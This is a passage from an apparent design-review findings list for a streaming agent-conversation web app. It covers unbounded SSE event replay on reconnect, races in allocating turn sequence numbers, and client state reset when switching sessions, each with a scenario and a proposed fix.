  - scenario: SSE replay cost grows unbounded over a long conversation, degrading reconnect UX and risking memory blowups. runs.controller.ts:32 replays ALL RunEvent rows for the runId on every (re)connect with no limit. A one-shot run has bounded events; a long interactive session accumulates thousands of text_delta + tool_use + tool_result rows across dozens of turns (the design even INCREASES delta volume via --include-partial-messages + 250ms flush). The design's reconnect+backoff (§5.7) means every transient network blip re-replays the entire history into the browser, re-parsing every JSON line and rebuilding the seen Set, causing visible jank and growing client memory. With concurrent tabs each doing this, it multiplies.
  - fix: Implement Last-Event-ID / resume-from-seq now rather than deferring it (the design lists it as later): the SSE endpoint should accept a since-seq and replay only seq>since. EventSource sends Last-Event-Id automatically on reconnect if the server sets the id: field per event. This bounds reconnect cost and is the natural fit for the existing seq dedup.
- **[medium] (data-consistency-and-ux)** No server-side serialization/allocation for ConversationTurn.seq and no client gating on in-flight turns; concurrent or rapid sends race the unique seq and produce confusing interleaved transcripts.
  - scenario: Concurrent tabs / rapid double-send produce out-of-order or interleaved turns the transcript can't represent coherently. ConversationTurn.seq is server-assigned 'max+1' (design §3.3, §4 POST /turns inserts seq=max+1). Two tabs (or one tab double-clicking Send before the first user event round-trips) both compute max+1 concurrently; without a DB-level allocation this races on @@unique([runId,seq]) (one POST 500s) OR, if serialized, the user fires turn B before turn A's result, and the single claude process receives A then B back-to-back on stdin. Claude may merge/queue them unpredictably, but the UI optimistically rendered them as two separate bubbles with two expected answers. The transcript then shows two user bubbles and one combined answer, or answers in an order the user didn't expect.
  - fix: Allocate ConversationTurn.seq inside a transaction (or a Postgres sequence per run) to avoid the unique-constraint race. On the client, disable Send while a turn is in flight (state already implies this: RUNNING=>Stop), and reject/queue a /turns POST server-side when the run is RUNNING (only accept new message turns in AWAITING_INPUT), so turns are strictly one-at-a-time and the transcript stays linear.
- **[low] (data-consistency-and-ux)** 'Never reset events/seen' is correct per-turn but dangerous if applied across session switches: per-run seq spaces both start low, so the shared seen Set will drop the new session's early events as duplicates and concatenate two transcripts.
  - scenario: AgentView never resetting events/seen across the session lifetime leaks memory and mis-handles switching sessions. The design explicitly says subscribe once and never reset events/seen on turn boundaries (fixing the TaskDetailPage reset bug). But the sessions list is real and routes /agents/:id/sessions/:runId — switching from session A to session B MUST reset events/seen, and the design's strong 'never reset' framing risks an implementation that resets on neither turn NOR session change, so switching sessions appends B's events onto A's transcript (seq spaces are per-run but both start near 0, so the seen Set will wrongly dedup B's low-seq events as already-seen from A).
  - fix: Scope the reset to runId identity, not turn boundaries: reset events/seen exactly when the subscribed runId changes (session switch), and never within a runId (turn boundary). Effectively keep TaskDetailPage's useEffect dependency on runId but ensure the runId is the stable conversation run, not runs[0].
